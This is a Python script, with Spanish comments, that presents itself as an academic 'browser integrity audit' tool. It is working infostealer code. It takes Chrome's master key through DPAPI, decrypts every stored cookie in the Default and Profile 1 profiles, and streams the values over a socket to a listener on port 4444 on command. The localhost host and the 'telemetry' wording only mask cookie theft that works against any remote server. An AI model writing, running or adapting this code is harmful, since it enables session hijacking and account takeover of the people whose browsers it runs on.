import os, json, base64, sqlite3, shutil, socket, win32crypt
from Crypto.Cipher import AES

# CONFIGURACIÓN DE SEGURIDAD: Solo permite conexión local para pruebas de auditoría
SERVER_HOST = "127.0.0.1" 
SERVER_PORT = 4444

def get_master_key():
    try:
        path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception:
        return None

def run_session_audit(sock):
    key = get_master_key()
    if not key: return
    
    user_data = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    for profile in ["Default", "Profile 1"]:
        db_path = os.path.join(user_data, profile, "Network", "Cookies")
        if not os.path.exists(db_path): continue
        
        # Copia temporal para no bloquear el navegador del sistema
        shutil.copy2(db_path, "audit_tmp.db")
        conn = sqlite3.connect("audit_tmp.db")
        cursor = conn.cursor()
        
        # Extracción de metadatos para análisis de persistencia
        cursor.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value FROM cookies")
        
        for row in cursor:
            h, n, p, exp, sec, htt, ss, enc = row
            try:
                iv, payload = enc[3:15], enc[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt(payload)[:-16]
                val_b64 = base64.b64encode(decrypted).decode('utf-8')
                
                # Formato de telemetría optimizado
                data = {"h": h, "n": n, "p": p, "e": exp, "s": sec, "ht": htt, "ss": ss, "v": val_b64}
                sock.sendall((json.dumps(data) + "\n").encode('utf-8'))
            except: continue
        conn.close()
        os.remove("audit_tmp.db")
    sock.sendall(b"EOF_METADATA")

def main():
    print("[!] Browser Integrity Audit Tool - Academic Research Only")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((SERVER_HOST, SERVER_PORT))
        while True:
            cmd = s.recv(1024).decode().strip()
            if cmd == "start_audit":
                run_session_audit(s)
            elif cmd == "exit":
                break
    except: pass
    finally: s.close()

if __name__ == "__main__":
    main()